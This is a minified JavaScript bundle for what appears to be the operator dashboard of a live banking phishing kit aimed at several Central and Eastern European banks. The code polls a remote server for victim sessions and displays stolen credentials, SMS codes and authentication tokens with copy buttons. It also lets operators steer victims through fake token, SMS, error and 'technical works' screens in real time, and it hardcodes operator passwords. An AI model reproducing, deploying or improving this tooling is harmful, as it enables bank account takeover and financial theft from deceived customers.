(this["webpackJsonptokenka-agents"]=this["webpackJsonptokenka-agents"]||[]).push([[0],{26:function(e,t,n){e.exports=n(52)},31:function(e,t,n){},32:function(e,t,n){},52:function(e,t,n){"use strict";n.r(t);var a=n(0),r=n.n(a),c=n(23),s=n.n(c),i=(n(31),n(32),n(3)),o=n(7),u=n(8),E=n(12),l=n(11),_=n(6),d=n(25),m=n(5),T=n.n(m),N=n(13),O=n(24),S=n.n(O),C=n(10),A=n.n(C),R=function(e,t){return Object.keys(t).reduce((function(t,n){return t[n]=e?"".concat(e,".").concat(n):"".concat(n),t}),{})},v=function(e){return R(void 0,e)},I=v({RAIFFEISEN:void 0,RAIFFEISEN_CZ:void 0,UNI_CREDIT:void 0,ALPHA:void 0,BCR:void 0,PRO_CREDIT:void 0,PIRAEUS:void 0,TATRA:void 0}),f=v({NEW:void 0,OLD:void 0,IGNORE:void 0,IMPORTANT:void 0}),p=R("USER",{ENTER_HOMEPAGE:void 0,NEW_USER:void 0,TYPING:void 0,LOGGING:void 0,SEND_CREDENTIALS:void 0,SEND_CREDENTIALS_TOKEN:void 0,SEND_CREDENTIALS_SMS:void 0,SEND_TOKEN:void 0,SEND_SMS:void 0,SEND_TECH_DATA:void 0,BCR_SEND_SYNC:void 0,RAIF_SEND_AUTH_CODE:void 0,RAIF_SEND_SMART_TOKEN:void 0,RAIF_SEND_SMART_TOKEN_SMS:void 0,UNICREDIT_SEND_IMAGE:void 0,UNICREDIT_SEND_SYNC:void 0,TATRA_SEND_CONFIRM:void 0,TATRA_SEND_CHALLENGE:void 0,RAIF_CZ_SEND_REACTIVATE:void 0,RAIF_CZ_SEND_REACTIVATE_APP:void 0}),g=R("INSTR",{GO_TO_HOME_SCREEN:void 0,SHOW_LOADING_STATE:void 0,ERR_MSG_INVALID_CREDENTIALS:void 0,GO_TO_ORIGINAL_SITE:void 0,GO_TO_TOKEN_SCREEN:void 0,GO_TO_SMS_SCREEN:void 0,GO_TO_TECH_SCREEN:void 0,BCR_GO_TO_SYNC_SCREEN:void 0,RAIF_GO_TO_AUTH_CODE_SCREEN:void 0,RAIF_GO_TO_SMART_TOKEN:void 0,RAIF_GO_TO_SMART_TOKEN_SMS:void 0,UNICREDIT_GO_TO_IMAGE:void 0,UNICREDIT_GO_TO_SYNC_SCREEN:void 0,TATRA_GO_TO_CONFIRM_SCREEN:void 0,TATRA_GO_TO_CHALLENGE_SCREEN:void 0,TATRA_GO_TO_CHALLENGE2_SCREEN:void 0,TATRA_GO_TO_CHALLENGE3_SCREEN:void 0,RAIF_CZ_GO_TO_REACTIVATE_SCREEN:void 0,RAIF_CZ_GO_TO_REACTIVATE_APP_SCREEN:void 0,RAIF_CZ_GO_TO_REACTIVATIA_SCREEN:void 0,RAIF_CZ_GO_TO_REACTIVATIA_OK_SCREEN:void 0}),b=function(){var e=[p.ENTER_HOMEPAGE,p.NEW_USER,p.TYPING,p.LOGGING];return Object.values(p).filter((function(t){return!e.includes(t)}))}(),G={get agent(){return JSON.parse(sessionStorage.getItem("agent"))},set agent(e){sessionStorage.setItem("agent",JSON.stringify(e))},get bank(){return JSON.parse(sessionStorage.getItem("bank"))},set bank(e){sessionStorage.setItem("bank",JSON.stringify(e))},get agents(){return[{id:1,username:"agent1",password:"1passw"},{id:2,username:"agent2",password:"2passw"},{id:3,username:"agent3",password:"passw3"},{id:4,username:"agent4",password:"passw4"},{id:7,username:"admin",password:"1admin1"}]}},k=function(e){return e.lockedBy===G.agent.id},D=function(e){return e.status===f.IMPORTANT},y=function(e){return e.status===f.IGNORE},M=Object(i.a)(Object(i.a)({},{restURL:"https://staticimg.a2hosted.com/v1/rest"}),{},{pullingInterval:1300}),h=M.restURL,F=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"GET",n=arguments.length>2?arguments[2]:void 0,a=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{updateLastActive:!0},r=(a.updateLastActive,G.lastActive||0);return S()({url:"".concat(h).concat(e),method:t,data:n,headers:{"last-active":r}}).then((function(e){return e.data})).then((function(e){return G.lastActive=e.lastActive,e.data}))},L=(new Audio("/pew.wav"),new Audio("/fart.wav")),j=function(e){e.users;(function(e){return!!e.find((function(e){return b.includes(e.action)}))})(e.messages)&&L.play()},P=M.pullingInterval,w={init:!1,start:function(e,t){var n=this;setInterval(Object(N.a)(T.a.mark((function t(){var a;return T.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,F("/agent/data/".concat(G.agent.id));case 2:a=t.sent,n.init&&j(a),n.init=!0,e(a);case 6:case"end":return t.stop()}}),t)}))),P)},send:function(e,t){return Object(N.a)(T.a.mark((function n(){return T.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:F("/message","PUT",{userId:e,action:t}).catch((function(e){return window.alert("Error for",t.type)}));case 1:case"end":return n.stop()}}),n)})))()}},H=function(e,t,n){return t.forEach((function(t){var n=e.findIndex((function(e){return e.id===t.id}));n<0?(e.push(t),setTimeout((function(){t.status===f.NEW&&(t.status=f.OLD)}),1e4)):e[n]=t})),e.reduce((function(e,t){var a=!!n.find((function(e){return e.userId===t.id}));return[].concat(Object(d.a)(e),[Object(i.a)(Object(i.a)({},t),{},{newMsg:a})])}),[])},U=function(e,t){var n=t.length&&t[t.length-1].action===p.TYPING,a=t.reduce((function(e,t){return function(e){return b.includes(e.action)}(t)&&(e.tokens.push(t.payload),e.lastImportantMsgTmstp=t.time),e}),{tokens:[],lastImportantMsgTmstp:null}),r=Object(i.a)(Object(i.a)({},e),{},{isTyping:n,tokens:a.tokens,lastImportantMsgTmstp:a.lastImportantMsgTmstp,messages:t});return setTimeout((function(){r.isTyping=!1}),2e3),r},x=n(1),K=Object(a.createContext)(),V=function(e){var t=Object(a.useState)(void 0),n=Object(x.a)(t,2),c=n[0],s=n[1];return r.a.createElement(K.Provider,{value:[c,s]},e.children)},Z=function(e,t){return function(n){n.stopPropagation();var a=t?G.agent.id:void 0;F("/agent/lockUser","POST",{userId:e,agentId:a})}};function Y(e){var t=e.user,n=Object(a.useContext)(K),c=Object(x.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"user ".concat(t.id===s&&"selected"," ").concat(D(t)&&"important"),onClick:function(){i(t.id),F("/agent/readUserMessages","POST",{userId:t.id,agentId:G.agent.id})}},r.a.createElement("div",{className:"user-info-descr"},r.a.createElement("div",{className:"user-id"},t.id),r.a.createElement("div",{className:"user-status ".concat(D(t)&&"important"," ").concat(y(t)&&"ignored")},t.status),r.a.createElement("div",null,t.description)),r.a.createElement("div",{className:"user-info-tokens"},r.a.createElement("div",null,"Tokens: ",r.a.createElement("b",null,t.tokens.length)),t.newMsg&&r.a.createElement("div",null,r.a.createElement("img",{src:"/msg.png",height:"44"}))),r.a.createElement("div",{className:"user-actions"},r.a.createElement(z,{user:t})))}function z(e){var t,n=e.user,c=n.id,s=n.lockedBy,i=s&&G.agents.find((function(e){return e.id===s})),o=k(n);return r.a.createElement("div",{className:"user-lock ".concat((t=n,t.lockedBy&&"locked")," ").concat(o&&"lockedByMe")},s?r.a.createElement(a.Fragment,null,r.a.createElement("span",null,"Locked by ",r.a.createElement("b",null,o?"me":i.username)),o&&r.a.createElement("button",{onClick:Z(c,!1)},"unlock")):r.a.createElement("button",{onClick:Z(c,!0)},"lock"))}r.a.Component;function B(e){var t=e.usersData,n=X(Object.values(t)),c=Object(a.useState)(""),s=Object(x.a)(c,2),i=s[0],o=s[1],u=ee(n,i).filter((function(e){return e.tokens&&e.tokens.length>0}));return r.a.createElement("div",{className:"users-container "},r.a.createElement(W,{filter:i,setFilter:o}),r.a.createElement("div",{className:"sidebar users "},u.map((function(e){return r.a.createElement(Y,{key:e.id,user:e})}))))}function W(e){var t=e.filter,n=e.setFilter;return r.a.createElement("div",{className:"users-filter"},"Filter ",r.a.createElement("input",{type:"text",value:t,onChange:function(e){return n(e.target.value)}}),r.a.createElement("button",{onClick:function(){return n("")}},"clear"))}var J=function(e){return function(t){return e(t)?-1:1}},$=J(k),q=J(D),Q=J(y),X=function(e){return e.sort((function(e,t){var n=Q(e),a=Q(t);if(n!==a)return a-n;var r=$(e),c=$(t);if(r!==c)return r-c;var s=q(e),i=q(t);if(s!==i)return s-i;var o=e.lastImportantMsgTmstp,u=t.lastImportantMsgTmstp;return o&&u?u-o:!o&&u?1:o&&!u?-1:t.id-e.id}))},ee=function(e,t){return t&&""!==t.trim()?e.filter((function(e){return e.id.toString().includes(t)||e.description&&e.description.includes(t)})):e};function te(e){var t=e.usersData,n=Object(a.useContext)(K),c=Object(x.a)(n,1)[0],s=t[c];return r.a.createElement("div",{className:"messages sidebar"},s&&r.a.createElement("div",null,r.a.createElement("div",null,r.a.createElement(Y,{user:s})),r.a.createElement(ne,{messages:s.messages}),r.a.createElement(ie,{userId:c})))}function ne(e){var t=e.messages;return r.a.createElement("div",{className:"user-messages"},t&&t.map((function(e){return r.a.createElement(re,{key:e.id,message:e})})))}var ae=function(e){return e.includes("USER")};function re(e){var t=e.message,n=t.action,a=t.payload,c=t.time,s=null;switch(n){case p.SEND_CREDENTIALS:case p.SEND_CREDENTIALS_TOKEN:case p.SEND_CREDENTIALS_SMS:case p.SEND_TOKEN:case p.SEND_SMS:case p.SEND_TECH_DATA:case p.RAIF_SEND_AUTH_CODE:case p.RAIF_SEND_SMART_TOKEN:case p.RAIF_SEND_SMART_TOKEN_SMS:case p.UNICREDIT_SEND_IMAGE:case p.UNICREDIT_SEND_SYNC:case p.TATRA_SEND_CONFIRM:case p.TATRA_SEND_CHALLENGE:case p.RAIF_CZ_SEND_REACTIVATE:case p.RAIF_CZ_SEND_REACTIVATE_APP:case p.BCR_SEND_SYNC:s=ce;break;case g.GO_TO_HOME_SCREEN:case g.GO_TO_TOKEN_SCREEN:case g.RAIF_GO_TO_AUTH_CODE_SCREEN:case g.GO_TO_SMS_SCREEN:case g.GO_TO_TECH_SCREEN:case g.GO_TO_ORIGINAL_SITE:case g.RAIF_GO_TO_SMART_TOKEN:case g.RAIF_GO_TO_SMART_TOKEN_SMS:case g.ERR_MSG_INVALID_CREDENTIALS:case g.SHOW_LOADING_STATE:case g.UNICREDIT_GO_TO_IMAGE:case g.UNICREDIT_GO_TO_SYNC_SCREEN:case g.TATRA_GO_TO_CONFIRM_SCREEN:case g.TATRA_GO_TO_CHALLENGE_SCREEN:case g.TATRA_GO_TO_CHALLENGE2_SCREEN:case g.TATRA_GO_TO_CHALLENGE3_SCREEN:case g.RAIF_CZ_GO_TO_REACTIVATE_SCREEN:case g.RAIF_CZ_GO_TO_REACTIVATE_APP_SCREEN:case g.RAIF_CZ_GO_TO_REACTIVATIA_SCREEN:case g.RAIF_CZ_GO_TO_REACTIVATIA_OK_SCREEN:case g.BCR_GO_TO_SYNC_SCREEN:s=se}return s?r.a.createElement("div",{className:"".concat(ae(n)?"user-msg":"agent-msg")},r.a.createElement("div",{className:"msg-item"},r.a.createElement("div",{className:"msg-time"},A()(c).format("HH:mm:ss")),r.a.createElement("div",{className:"msg-action"},r.a.createElement(s,{action:n,payload:a})))):null}function ce(e){var t=e.action,n=e.payload,c=t;switch(t){case p.SEND_CREDENTIALS:c="Credentials";break;case p.SEND_CREDENTIALS_TOKEN:c="Credentials Token";break;case p.SEND_CREDENTIALS_SMS:c="Credentials SMS";break;case p.SEND_TOKEN:c="Token";break;case p.RAIF_SEND_AUTH_CODE:c="Pers fizice Auth code";break;case p.SEND_SMS:c="Pers fizice SMS code";break;case p.RAIF_SEND_SMART_TOKEN:c="Pers fizice Smart Token";break;case p.RAIF_SEND_SMART_TOKEN_SMS:c="Pers fizice Smart Token SMS";break;case p.SEND_TECH_DATA:c="Technical data";break;case p.UNICREDIT_SEND_IMAGE:c="Pers fizice image";break;case p.UNICREDIT_SEND_SYNC:c="Cod sincronizare";break;case p.TATRA_SEND_CONFIRM:c="Confirmation screen";break;case p.TATRA_SEND_CHALLENGE:c="Challenge screen";break;case p.RAIF_CZ_SEND_REACTIVATE:c="Reactivate code";break;case p.RAIF_CZ_SEND_REACTIVATE_APP:c="Reactivate app";break;case p.BCR_SEND_SYNC:c="Sincronizare token"}return r.a.createElement("div",{className:"msg-payload"},r.a.createElement("label",null,c,":"),n&&n.split(";;").map((function(e){return r.a.createElement(a.Fragment,null,r.a.createElement("span",{className:"msg-payload-value"},e),r.a.createElement("button",{onClick:function(){!function(e){var t=document.createElement("textarea");t.value=e,t.setAttribute("readonly",""),t.style={position:"absolute",left:"-9999px"},document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t)}(e)}},"copy"))})))}function se(e){var t=e.action,n=e.payload;return r.a.createElement("div",null,r.a.createElement("label",null,t),r.a.createElement("span",{className:"msg-payload-value"},n))}function ie(e){var t=e.userId,n=Object(a.useState)(""),c=Object(x.a)(n,2),s=c[0],i=c[1];return r.a.createElement("div",{className:"agent-actions"},r.a.createElement("h3",{style:{margin:"0px"}},G.bank),r.a.createElement("div",{className:"agent-actions-update-user"},r.a.createElement("div",{className:"agent-action-description"},r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)}}),r.a.createElement("button",{onClick:function(){return Ee(t,s,i)}},"add description")),r.a.createElement("div",{className:"agent-action-status"},r.a.createElement("button",{onClick:function(){return le(t,f.IGNORE)}},"Ignore"),r.a.createElement("button",{onClick:function(){return le(t,f.IMPORTANT)}},"Important"))),r.a.createElement("div",{className:"agent-action-instructions"},r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.GO_TO_HOME_SCREEN})}},"Home"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.GO_TO_SMS_SCREEN})}},"Pers fizice SMS Code"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.GO_TO_TECH_SCREEN})}},"Technical Works"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.GO_TO_ORIGINAL_SITE})}},"Original site"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.ERR_MSG_INVALID_CREDENTIALS})}},"Error Input")),r.a.createElement(oe,{userId:t,type:g.GO_TO_TOKEN_SCREEN,text:"Token"}),r.a.createElement("div",null,G.bank===I.RAIFFEISEN&&r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_GO_TO_AUTH_CODE_SCREEN})}},"Pers fizice Auth Code"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_GO_TO_SMART_TOKEN})}},"Pers fizice Smart Token"),r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_GO_TO_SMART_TOKEN_SMS})}},"Pers fizice Smart Token SMS")),G.bank===I.UNI_CREDIT&&r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.UNICREDIT_GO_TO_IMAGE})}},"Pers fizice Image"),"\xa0\xa0\xa0\xa0",r.a.createElement(ue,{userId:t,type:g.UNICREDIT_GO_TO_SYNC_SCREEN,label1:"suma",label2:"contul",btnText:"Sincronizare Screen"})),G.bank===I.TATRA&&r.a.createElement("div",null,r.a.createElement(ue,{userId:t,type:g.TATRA_GO_TO_CONFIRM_SCREEN,label1:"suma",label2:"number",btnText:"Confirm Screen"}),r.a.createElement("br",null),r.a.createElement(oe,{userId:t,type:g.TATRA_GO_TO_CHALLENGE_SCREEN,text:"Challenge1"}),"\xa0\xa0",r.a.createElement(oe,{userId:t,type:g.TATRA_GO_TO_CHALLENGE2_SCREEN,text:"Challenge2"}),"\xa0\xa0",r.a.createElement(oe,{userId:t,type:g.TATRA_GO_TO_CHALLENGE3_SCREEN,text:"Challenge3"})),G.bank===I.RAIFFEISEN_CZ&&r.a.createElement("div",null,r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_CZ_GO_TO_REACTIVATE_SCREEN})}},"Reactivate code"),"\xa0\xa0\xa0\xa0",r.a.createElement(oe,{userId:t,type:g.RAIF_CZ_GO_TO_REACTIVATE_APP_SCREEN,text:"Reactivate app"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_CZ_GO_TO_REACTIVATIA_SCREEN})}},"Reactivatia"),"\xa0\xa0\xa0\xa0",r.a.createElement("button",{onClick:function(){return w.send(t,{type:g.RAIF_CZ_GO_TO_REACTIVATIA_OK_SCREEN})}},"Reactivatia Success"))),G.bank===I.BCR&&r.a.createElement("div",null,r.a.createElement(ue,{userId:t,type:g.BCR_GO_TO_SYNC_SCREEN,label1:"suma",label2:"contul",btnText:"Sincronizare Screen"}))))}function oe(e){var t=e.userId,n=e.type,c=e.text,s=Object(a.useState)(""),i=Object(x.a)(s,2),o=i[0],u=i[1];return r.a.createElement(a.Fragment,null,r.a.createElement("input",{type:"text",value:o,onChange:function(e){return u(e.target.value)}}),r.a.createElement("button",{onClick:function(){w.send(t,{type:n,payload:o}),u("")}},c))}function ue(e){var t=e.userId,n=e.type,c=e.label1,s=e.label2,i=e.btnText,o=Object(a.useState)(""),u=Object(x.a)(o,2),E=u[0],l=u[1],_=Object(a.useState)(""),d=Object(x.a)(_,2),m=d[0],T=d[1];return r.a.createElement(a.Fragment,null,c,": ",r.a.createElement("input",{type:"text",value:E,onChange:function(e){return l(e.target.value)}}),s,": ",r.a.createElement("input",{type:"text",value:m,onChange:function(e){return T(e.target.value)}}),r.a.createElement("button",{onClick:function(){w.send(t,{type:n,payload:"".concat(E).concat(";;").concat(m)}),l(""),T("")}},i))}var Ee=function(e,t,n){F("/agent/description","POST",{userId:e,description:t}),n("")},le=function(e,t){F("/agent/status","POST",{userId:e,status:t})},_e=function(e){Object(E.a)(n,e);var t=Object(l.a)(n);function n(){var e;return Object(o.a)(this,n),(e=t.call(this)).state={messages:[],users:[]},e}return Object(u.a)(n,[{key:"componentDidMount",value:function(){var e=this;console.log("****init"),w.start((function(t){var n,a,r=t.users,c=t.messages,s=t.unread;console.log("data",{users:r,messages:c,unread:s}),e.setState(Object(i.a)(Object(i.a)({},e.state),{},{users:H(e.state.users,r,s),messages:(n=e.state.messages,a=c,a.reduce((function(e,t){var n;return n=t,e.find((function(e){return e.id===n.id}))||e.push(t),e}),n))}))}))}},{key:"render",value:function(){var e=this.state,t=function(e,t){return e.reduce((function(e,n){return Object(i.a)(Object(i.a)({},e),{},Object(_.a)({},n.id,U(n,function(e,t){return t.filter((function(t){return t.userId===e.id}))}(n,t))))}),{})}(e.users,e.messages);return r.a.createElement("div",null,r.a.createElement("div",{className:"welcome"},r.a.createElement(V,null,r.a.createElement(B,{usersData:t}),r.a.createElement(te,{usersData:t}))))}}]),n}(r.a.Component),de=I.RAIFFEISEN_CZ;function me(e){var t=G.agent&&Oe(G.agent.username,G.agent.password),n=Object(a.useState)(t),c=Object(x.a)(n,2),s=c[0],i=c[1];return s?r.a.createElement(a.Fragment,null,e.children):r.a.createElement(Te,{setLogged:i})}function Te(e){var t=e.setLogged,n=Object(a.useState)(""),c=Object(x.a)(n,2),s=c[0],i=c[1],o=Object(a.useState)(""),u=Object(x.a)(o,2),E=u[0],l=u[1],_=Object(a.useState)(de),d=Object(x.a)(_,2),m=d[0],T=d[1],N=Object(a.useState)(!1),O=Object(x.a)(N,2),S=O[0],C=O[1];return r.a.createElement("div",{className:"login"},r.a.createElement("div",null,r.a.createElement("select",{id:"banks",name:"banks",onChange:function(e){return T(e.target.value)},defaultValue:de},Object.keys(I).sort().map((function(e){return r.a.createElement("option",{value:e},e)})))),r.a.createElement("div",null,r.a.createElement("input",{type:"text",value:s,onChange:function(e){return i(e.target.value)},placeholder:"username"})),r.a.createElement("div",null,r.a.createElement("input",{type:"password",value:E,onChange:function(e){return l(e.target.value)},placeholder:"password"})),r.a.createElement("div",null,r.a.createElement("button",{onClick:function(e){return Ne(s,E,C,t,m)}},"login")),S&&r.a.createElement("div",{className:"error"},"Invalid Credentials"))}var Ne=function(e,t,n,a,r){var c=Oe(e,t);G.bank=r,c?(G.agent=c,n(!1),a(!0)):n(!0)},Oe=function(e,t){return G.agents.find((function(n){return n.username===e&&n.password===t}))};console.log("ENV:","production");var Se=function(){return r.a.createElement("div",{className:"App"},r.a.createElement(me,null,r.a.createElement(_e,null)))};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));s.a.render(r.a.createElement(r.a.StrictMode,null,r.a.createElement(Se,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()})).catch((function(e){console.error(e.message)}))}},[[26,1,2]]]);
//# sourceMappingURL=main.83b42061.chunk.js.map